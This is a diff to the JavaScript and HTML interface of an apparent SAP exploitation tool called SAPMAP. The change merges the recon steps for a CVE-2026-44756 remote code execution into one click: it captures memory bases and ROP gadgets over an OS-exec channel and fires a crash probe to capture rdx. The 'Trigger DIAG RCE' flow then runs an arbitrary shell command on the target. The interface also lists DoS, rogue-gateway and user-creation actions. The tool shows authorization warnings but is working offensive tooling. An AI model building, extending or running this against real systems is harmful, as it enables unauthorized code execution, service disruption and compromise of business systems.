@@ -1264,10 +1264,8 @@ body {
       <div class="ctx-item" data-action="betrusted">&#128272; Betrusted — Inject Trusted IP (10KBLAZE)</div>
       <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
       <div class="ctx-item" data-action="exploit_cve_44756_dos" title="Pre-auth HTTP impact proof.  Fires a bug-C EPP passport at the ICM endpoint and crashes ONE worker process.  ICM auto-restarts the worker within 1-3s, so this is non-destructive.  No OS-exec needed, no recon needed — use it purely to confirm the CVE lands on this kernel PL.  If the vuln fingerprint is already present (kernel_pl_below_fix), this promotes the finding to dos_confirmed.">&#9889; Trigger CVE-2026-44756 DoS (crashes ICM worker)</div>
-      <div class="ctx-item" data-action="capture_cve_44756_bases" title="Recon step 1 of 3 for the DIAG RCE.  Uses the node's OS-exec channel (SXPG / GW-SAPXPG / SAPControl / CVE-2025-31324 shell) to read the live dw + libc runtime bases from /proc/&lt;wp_pid&gt;/maps.  Non-destructive.  Populates node.cve_2026_44756_dw_base / libc_base for later use.  Required because dw is compiled PIE and libc is ASLR-randomised — both bases must be captured live for THIS specific dispatcher lifetime.">&#128270; Capture CVE-2026-44756 bases (recon-only, via OS-exec)</div>
-      <div class="ctx-item" data-action="capture_cve_44756_gadgets" title="Recon step 2 of 3 for the DIAG RCE.  Deploys tools/cve-2026-44756/find_gadgets.py to /tmp on the target and runs it against the exact disp+work + libc on this instance to derive stage1_dw_off, stage2_libc_off, system_libc_off (with the do_system skip-push alignment fix), stage2_disp_rdi and stage2_b_off.  Non-destructive.  Gadget offsets differ between kernel PLs and glibc versions, so this must be run per-target; the results are cached on the node.">&#128270; Capture CVE-2026-44756 gadgets (recon-only, via OS-exec)</div>
-      <div class="ctx-item" data-action="exploit_cve_44756_diag_crash" title="Recon step 3 of 3 for the DIAG RCE.  Fires a bug_c_low32 with a dummy target RIP (0x11112222) at the DIAG dispatcher, deliberately crashing one work process.  USE ONLY WITH tools/cve-2026-44756/find_rdx.py already running on the target as &lt;sid&gt;adm — its ptrace attach observes the crash and reports the session-buffer landing address rdx, which the RCE chain needs.  rdx varies per DIAG session (~64 KB stride).  Crashes one WP; sapstartsrv respawns it within seconds.">&#9889; Trigger CVE-2026-44756 DIAG crash probe (for rdx capture)</div>
-      <div class="ctx-item" data-action="exploit_cve_44756_diag_rce" title="THE actual RCE fire.  Sends a bug-C passport with a full 2-stage ROP chain over DIAG.  Chain: dw stage1 (mov rdi,[rdx+K]) → libc stage2 → __libc_system(cmd_addr).  Runs the operator-supplied shell command as &lt;sid&gt;adm on the target.  Prerequisites (all from the three recon items above): dw_base + libc_base cached, stage offsets cached, rdx just measured with find_rdx.py.  One WP crashes but sapstartsrv respawns it — the command executes before the crash is delivered.  Prompts for the command to run.">&#9889; Trigger CVE-2026-44756 DIAG RCE (arbitrary command)</div>
+      <div class="ctx-item" data-action="capture_cve_44756_prepare_rce" title="One-click recon for the DIAG RCE.  Chains the three prep steps that used to be separate menu items: (1) reads live dw+libc bases from /proc/&lt;wp&gt;/maps via the node's OS-exec channel; (2) deploys find_gadgets.py to derive per-target stage1/stage2/system offsets; (3) fires a bug_c_low32 crash probe over DIAG so the operator's find_rdx.py can catch the SIGSEGV and read rdx.  Prompts you once at the end to paste the FIND_RDX_OK line — SAPMAP parses out rdx and caches every value on the node.  After this runs, 'Trigger DIAG RCE' only asks for the shell command; no re-typing.">&#128270; Prepare CVE-2026-44756 DIAG RCE (bases + gadgets + rdx, one-click)</div>
+      <div class="ctx-item" data-action="exploit_cve_44756_diag_rce" title="THE actual RCE fire.  Sends a bug-C passport with a full 2-stage ROP chain over DIAG.  Chain: dw stage1 (mov rdi,[rdx+K]) → libc stage2 → __libc_system(cmd_addr).  Runs the operator-supplied shell command as &lt;sid&gt;adm on the target.  Prerequisite: 'Prepare CVE-2026-44756 DIAG RCE' has been run so bases + gadgets + rdx are cached on the node.  With everything cached, this prompts ONLY for the command; nothing else to re-type.  One WP crashes but sapstartsrv respawns it — the command executes before the crash is delivered.">&#9889; Trigger CVE-2026-44756 DIAG RCE (arbitrary command)</div>
       <div class="ctx-item" data-action="exploit_cve_58240_register">&#9889; Register Rogue ASCS Gateway (CVE-2026-58240)</div>
       <div class="ctx-item" data-action="exploit_cve_58240_unregister">&#128245; Unregister Rogue ASCS Gateway (cleanup)</div>
       <div class="ctx-item" data-action="create_user_java">&#128100; Create User (Java UME)</div>
@@ -6004,19 +6002,13 @@ function showCtxMenu(e, sid) {
     'check_cve_44756':              isAbapStack || isWebDispatcher,
     // DoS trigger available once the check has flagged an ICM port.
     'exploit_cve_44756_dos':        hasCve44756Endpoint,
-    // Base capture only makes sense on Linux ABAP / dual-stack nodes
-    // AND requires a check to have flagged the target as vulnerable
-    // (otherwise there is no reason to burn OS-exec traffic).
-    'capture_cve_44756_bases':      hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
-    'capture_cve_44756_gadgets':    hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
-    // DIAG RCE requires a vulnerable verdict; recon-values are prompted
-    // for or auto-captured at trigger time.
+    // One-click recon that chains bases + gadgets + rdx capture into
+    // the DIAG RCE flow.  Only shown once the target is confirmed
+    // vulnerable (otherwise there's no reason to burn OS-exec traffic).
+    'capture_cve_44756_prepare_rce': hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
+    // DIAG RCE requires a vulnerable verdict; when Prepare RCE has
+    // already cached everything, the RCE prompt asks only for the cmd.
     'exploit_cve_44756_diag_rce':   hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
-    // Crash probe: only shown once the target is confirmed vulnerable.
-    // It's the step that unblocks the rdx-capture catch-22 — the RCE
-    // handler needs rdx, and this crash probe is what makes the WP die
-    // so find_rdx.py on the target can read rdx via ptrace.
-    'exploit_cve_44756_diag_crash': hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
     'exploit_cve_58240_register':   hasCve58240Check,      // need check to have flagged opcodes present
     'exploit_cve_58240_unregister': hasCve58240Registered, // only after we've actually registered
     'check_cve_6287':        isJavaStack,             // Java-only RECON check
@@ -6323,10 +6315,8 @@ function showCtxMenu(e, sid) {
     'check_cve_58240':       'Only applicable to ABAP / double-stack systems (MS is an ABAP kernel component)',
     'check_cve_44756':              'Only applicable to systems with an ICM (ABAP / double-stack / Web Dispatcher)',
     'exploit_cve_44756_dos':        'Run "Check CVE-2026-44756" first — no ICM port on record',
-    'capture_cve_44756_bases':      'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
-    'capture_cve_44756_gadgets':    'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
-    'exploit_cve_44756_diag_rce':   'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
-    'exploit_cve_44756_diag_crash': 'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
+    'capture_cve_44756_prepare_rce': 'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
+    'exploit_cve_44756_diag_rce':    'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
     'exploit_cve_58240_register':   'Run "Check CVE-2026-58240" first — need a target where the opcode family is recognised',
     'exploit_cve_58240_unregister': 'Nothing to clean up — no rogue ASCS gateway has been registered from this session',
     'check_cve_6287':        'Only applicable to Java / double-stack systems',
@@ -6632,10 +6622,8 @@ function showCtxMenu(e, sid) {
     // The RCE-track actions live under Exploitation.  Hide them until
     // the check has flagged the node as vulnerable — showing them on
     // patched or unchecked nodes just clutters the menu.
-    'capture_cve_44756_bases':        !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
-    'capture_cve_44756_gadgets':      !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
+    'capture_cve_44756_prepare_rce':  !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_44756_diag_rce':     !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
-    'exploit_cve_44756_diag_crash':   !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_58240_register':     !hasCve58240Check,
     'exploit_cve_58240_unregister':   !hasCve58240Registered,
     'analyse_capabilities':       !isAbapStack,
@@ -8025,87 +8013,130 @@ async function ctxAction(action) {
       await api('POST', `node/${sid}/exploit_cve_2026_44756_dos`, {confirm: true});
       break;
     }
-    case 'exploit_cve_44756_diag_crash': {
+    case 'capture_cve_44756_prepare_rce': {
       const nn = (mapState.nodes || {})[sid];
       if (!nn) { showToast('Node not found', 'warn'); break; }
+      const sidLower = sid.toLowerCase();
       const info =
-        '⚠️ DESTRUCTIVE — CVE-2026-44756 DIAG crash probe\n\n'
-        + 'This exists to unblock a chicken-and-egg problem: the DIAG '
-        + 'RCE handler needs an rdx value (session-buffer address), but '
-        + 'rdx can only be read from a work process the moment it '
-        + 'crashes.  So this action delivers a bug-C payload with a '
-        + 'DELIBERATELY-BAD saved return address (0x4142434445).  '
-        + 'One work process on ' + sid + ' crashes — SAP re-forks it '
-        + 'within seconds — but before it dies your find_rdx.py '
-        + 'helper on the target catches the crash and prints rdx.\n\n'
-        + 'BEFORE clicking OK: on the target, as ' + sid.toLowerCase()
-        + 'adm, run:\n'
+        'Prepare CVE-2026-44756 DIAG RCE — one-click recon.\n\n'
+        + 'SAPMAP will run three steps in order:\n\n'
+        + '  1. Capture bases — reads dw + libc from /proc/<wp>/maps '
+        + 'via the node\'s OS-exec channel (SXPG / GW SAPXPG / '
+        + 'SAPControl / CVE-2025-31324 shell).  No crash.\n'
+        + '  2. Capture gadgets — deploys find_gadgets.py on the '
+        + 'target, extracts stage1/stage2/system offsets for THIS '
+        + 'kernel PL + glibc build.  No crash.\n'
+        + '  3. Trigger the rdx crash probe — sends a bug_c_low32 with '
+        + 'a dummy target RIP over DIAG.  ONE work process on ' + sid
+        + ' crashes; sapstartsrv respawns it within seconds.\n\n'
+        + 'BEFORE clicking OK, open a shell on the target as '
+        + sidLower + 'adm and run:\n\n'
         + '    python3 tools/cve-2026-44756/find_rdx.py ' + sid + '\n\n'
-        + 'It will say "attached to N process(es) — deliver the DIAG '
-        + 'bug-C probe now".  THEN come back and click OK here.\n\n'
+        + 'It attaches via ptrace and waits.  When step 3 fires, '
+        + 'find_rdx.py catches the SIGSEGV and prints one line like\n'
+        + '    FIND_RDX_OK:pid=12345 rdx=0x7f5608836f0d rip=… sig=11\n\n'
+        + 'After step 3 returns, SAPMAP will prompt you once for '
+        + 'that line — paste it and rdx is cached on the node.  '
+        + 'From that point "Trigger DIAG RCE" only asks for the '
+        + 'command.\n\n'
         + '❌ DO NOT run against production systems.\n'
         + '✅ Confirm ONLY if you have written authorization to test '
         + sid + '.\n\nProceed?';
       if (!confirm(info)) break;
-      await api('POST', `node/${sid}/exploit_cve_2026_44756_diag_crash_probe`, {confirm: true});
-      break;
-    }
-    case 'capture_cve_44756_gadgets': {
-      const nn = (mapState.nodes || {})[sid];
-      if (!nn) { showToast('Node not found', 'warn'); break; }
-      const info =
-        'CVE-2026-44756 gadget capture (recon-only)\n\n'
-        + 'SAPMAP will deploy tools/cve-2026-44756/find_gadgets.py to '
-        + 'the target via the existing OS-exec channel, scan the '
-        + 'target\'s disp+work and libc for the three CVE-2026-44756 '
-        + 'gadget offsets, and cache them on the node.\n\n'
-        + 'Once cached, "Trigger CVE-2026-44756 DIAG RCE" uses them '
-        + 'automatically — no more 5 override prompts per run.\n\n'
-        + 'No exploit is fired. Nothing crashes. Only recon.\n\n'
-        + 'Proceed?';
-      if (!confirm(info)) break;
-      await api('POST', `node/${sid}/exploit_cve_2026_44756_capture_gadgets`, {});
-      break;
-    }
-    case 'capture_cve_44756_bases': {
-      const nn = (mapState.nodes || {})[sid];
-      if (!nn) { showToast('Node not found', 'warn'); break; }
-      const info =
-        'CVE-2026-44756 base capture (recon-only)\n\n'
-        + 'SAPMAP will use its existing OS-exec channel '
-        + '(SXPG / GW SAPXPG / SAPControl OSExecute / CTCWebService / '
-        + 'CVE-2025-31324 shell) to read /proc/<wp_pid>/maps on the '
-        + 'target and extract the disp+work and libc bases.\n\n'
-        + 'No exploit is fired. Nothing crashes. The bases are cached '
-        + 'on the node so the DIAG RCE action can reuse them without '
-        + 'another exec round-trip.\n\n'
-        + 'Requires an OS-exec primitive to already be available for '
-        + sid + '.\n\nProceed?';
-      if (!confirm(info)) break;
-      await api('POST', `node/${sid}/exploit_cve_2026_44756_capture_bases`, {});
+
+      // Fire the sequenced backend endpoint — it runs bases → gadgets
+      // → crash-probe in one background thread so the operator sees a
+      // linear console log.
+      showToast('Prepare RCE started — watch console for steps 1/3, 2/3, 3/3', 'info');
+      await api('POST',
+        `node/${sid}/exploit_cve_2026_44756_prepare_rce`,
+        {confirm: true});
+
+      // Paste rdx.  The backend endpoint runs asynchronously; the
+      // operator watches the console until they see:
+      //   [!!] <SID>: DIAG crash CONFIRMED
+      // and their find_rdx.py session prints the FIND_RDX_OK line.
+      // They can paste either the whole line or just the hex.
+      const rdxRaw = prompt(
+        'Watch the console: when you see\n'
+        + '    [!!] ' + sid + ': DIAG crash CONFIRMED\n'
+        + 'your find_rdx.py session on the target should have printed:\n'
+        + '    FIND_RDX_OK:pid=12345 rdx=0x7f5608836f0d rip=… sig=11\n\n'
+        + 'Paste that line here (or just the rdx=0x… value).  SAPMAP '
+        + 'parses out rdx and caches it on the node so "Trigger DIAG '
+        + 'RCE" won\'t re-ask.\n\n'
+        + 'Leave blank / Cancel if find_rdx.py did not print '
+        + 'FIND_RDX_OK — you can re-run "Prepare RCE" to retry.',
+        '');
+      if (rdxRaw === null) break;
+      const rdxTrim = rdxRaw.trim();
+      if (!rdxTrim) {
+        showToast('rdx not cached — re-run Prepare RCE if find_rdx.py missed the crash', 'warn');
+        break;
+      }
+      const cacheRes = await api('POST',
+        `node/${sid}/cve_2026_44756_cache_rdx`,
+        {rdx_hex: rdxTrim});
+      if (cacheRes && cacheRes.status === 'ok') {
+        showToast('rdx cached (' + cacheRes.rdx_hex + ') — Prepare RCE complete', 'ok');
+      } else {
+        showToast('rdx cache failed: ' + (cacheRes && cacheRes.error || 'unknown'), 'warn');
+      }
       break;
     }
     case 'exploit_cve_44756_diag_rce': {
       const nn = (mapState.nodes || {})[sid];
       if (!nn) { showToast('Node not found', 'warn'); break; }
-      // Assemble the operator form — command, override bases, rdx.
+      // Assemble the operator form.  When Prepare RCE has already run,
+      // every recon value is cached on the node and we ONLY ask for the
+      // shell command.  Missing values fall through to per-value
+      // prompts (kept for the manual/advanced path).
       const defaultCmd = 'id > /tmp/sapmap_cve_44756_proof.txt';
       const cachedDw   = nn.cve_2026_44756_dw_base   || '';
       const cachedLibc = nn.cve_2026_44756_libc_base || '';
       const cachedRdx  = nn.cve_2026_44756_session_rdx || '';
-      const warning =
-        '⚠️ DESTRUCTIVE — CVE-2026-44756 DIAG RCE\n\n'
-        + 'This will:\n'
-        + '  • Send a crafted Extended Passport over the SAP DIAG protocol\n'
-        + '  • Overwrite the saved return address of a work process on ' + sid + '\n'
-        + '  • Execute an attacker-controlled shell command via a two-stage COP chain\n'
-        + '  • Kill the delivering work process (SAP re-forks it within seconds)\n\n'
-        + '❌ DO NOT run against production systems.\n'
-        + '✅ Confirm ONLY if you have written authorization to test ' + sid + '.\n\n'
-        + 'You will be prompted for the command to run, and — if not already '
-        + 'cached on the node — for the per-instance recon values (dw_base, '
-        + 'libc_base, rdx).\n\n'
-        + 'Proceed?';
+      const cachedS1   = nn.cve_2026_44756_stage1_dw_off   || '';
+      const cachedS2   = nn.cve_2026_44756_stage2_libc_off || '';
+      const cachedSY   = nn.cve_2026_44756_system_libc_off || '';
+      const hasAllCached = !!(cachedDw && cachedLibc && cachedRdx
+                              && cachedS1 && cachedS2 && cachedSY);
+
+      let warning;
+      if (hasAllCached) {
+        warning =
+          '⚠️ DESTRUCTIVE — CVE-2026-44756 DIAG RCE\n\n'
+          + 'All recon values are cached on the node (from "Prepare '
+          + 'RCE"):\n'
+          + '  • dw_base    ' + cachedDw + '\n'
+          + '  • libc_base  ' + cachedLibc + '\n'
+          + '  • rdx        ' + cachedRdx + '\n'
+          + '  • stage1_dw  ' + cachedS1 + '\n'
+          + '  • stage2_lc  ' + cachedS2 + '\n'
+          + '  • system_lc  ' + cachedSY + '\n\n'
+          + 'This will:\n'
+          + '  • Send a crafted Extended Passport over the SAP DIAG protocol\n'
+          + '  • Overwrite the saved return address of a work process on ' + sid + '\n'
+          + '  • Execute your shell command via a two-stage COP chain\n'
+          + '  • Kill the delivering work process (SAP re-forks it within seconds)\n\n'
+          + '❌ DO NOT run against production systems.\n'
+          + '✅ Confirm ONLY if you have written authorization to test ' + sid + '.\n\n'
+          + 'The next prompt asks ONLY for the command to run.\n\nProceed?';
+      } else {
+        warning =
+          '⚠️ DESTRUCTIVE — CVE-2026-44756 DIAG RCE\n\n'
+          + 'This will:\n'
+          + '  • Send a crafted Extended Passport over the SAP DIAG protocol\n'
+          + '  • Overwrite the saved return address of a work process on ' + sid + '\n'
+          + '  • Execute an attacker-controlled shell command via a two-stage COP chain\n'
+          + '  • Kill the delivering work process (SAP re-forks it within seconds)\n\n'
+          + 'Recon values are NOT fully cached on the node — SAPMAP will '
+          + 'prompt for whichever are missing.  Tip: run "Prepare '
+          + 'CVE-2026-44756 DIAG RCE" first to capture everything in '
+          + 'one click.\n\n'
+          + '❌ DO NOT run against production systems.\n'
+          + '✅ Confirm ONLY if you have written authorization to test ' + sid + '.\n\n'
+          + 'Proceed?';
+      }
       if (!confirm(warning)) break;
       const command = prompt('Shell command to run on the target (via system()):',
                               defaultCmd);
@@ -8133,18 +8164,15 @@ async function ctxAction(action) {
         const v = prompt(
           'Session-buffer landing address rdx (hex) — REQUIRED.\n\n'
           + 'This value is per-instance and cannot be derived remotely without '
-          + 'a live ptrace attach.  Two-step workflow:\n\n'
-          + '  1. On the target, as ' + sid.toLowerCase() + 'adm:\n'
-          + '        python3 tools/cve-2026-44756/find_rdx.py ' + sid + '\n'
-          + '     (attaches to every work process, waits for a crash)\n\n'
-          + '  2. Back in SAPMAP:  right-click → Exploitation →\n'
-          + '     "Trigger CVE-2026-44756 DIAG crash probe"\n'
-          + '     (sends a bug-C payload with a deliberately-bad RIP;\n'
-          + '     one WP crashes; find_rdx.py catches it and prints:\n'
-          + '        FIND_RDX_OK:pid=<pid> rdx=0x<hex> rip=<hex> sig=<n>)\n\n'
-          + '  3. Paste that rdx value here.\n\n'
-          + 'rdx stays valid for the SAP instance\'s lifetime, so you\n'
-          + 'only measure it once per target.\n\n'
+          + 'a live ptrace attach.  Recommended path:\n\n'
+          + '  Right-click → Exploitation → "Prepare CVE-2026-44756 '
+          + 'DIAG RCE".  It runs the crash probe, has you paste the '
+          + 'FIND_RDX_OK line, and caches rdx on the node.  From then '
+          + 'on this dialog will not ask for rdx.\n\n'
+          + 'Manual fallback: run tools/cve-2026-44756/find_rdx.py '
+          + sid + ' on the target as ' + sid.toLowerCase() + 'adm, '
+          + 'then trigger the crash probe from a prior menu action, '
+          + 'and paste the rdx value here.\n\n'
           + 'Format: 0x7976338EC35D',
           '');
         if (v === null) break;
@@ -8168,15 +8196,15 @@ async function ctxAction(action) {
       // a prior manual entry OR from "Capture CVE-2026-44756 gadgets"),
       // skip the override prompt entirely — the backend picks them up
       // automatically.
-      const cachedS1  = nn.cve_2026_44756_stage1_dw_off   || '';
-      const cachedS2  = nn.cve_2026_44756_stage2_libc_off || '';
-      const cachedSY  = nn.cve_2026_44756_system_libc_off || '';
+      // cachedS1 / cachedS2 / cachedSY are already declared above with
+      // the RCE summary; the two below (disp_rdi / b_off) are only
+      // needed here.
       const cachedDR  = nn.cve_2026_44756_stage2_disp_rdi || '';
       const cachedBO  = nn.cve_2026_44756_stage2_b_off    || '';
       const hasAllCachedGadgets = !!(cachedS1 && cachedS2 && cachedSY);
       let useOverride = false;
       if (hasAllCachedGadgets) {
-        showToast('Using cached gadget offsets from "Capture CVE-2026-44756 gadgets"',
+        showToast('Using cached gadget offsets from "Prepare CVE-2026-44756 DIAG RCE"',
                    'info');
       } else {
         useOverride = confirm(
@@ -8185,8 +8213,8 @@ async function ctxAction(action) {
           + 'any other build you likely need per-target offsets or the '
           + 'delivery will succeed on the wire but nothing runs (RIP '
           + 'hijack lands on the wrong instruction and SIGSEGVs).\n\n'
-          + 'TIP: right-click → Exploitation → "Capture CVE-2026-44756 '
-          + 'gadgets" auto-fills every value.  You\'d only override '
+          + 'TIP: right-click → Exploitation → "Prepare CVE-2026-44756 '
+          + 'DIAG RCE" auto-fills every value.  You\'d only override '
           + 'manually if that action isn\'t available.\n\n'
           + 'OK  = enter overrides now.\n'
           + 'Cancel = use defaults (Julian\'s build).\n\n'
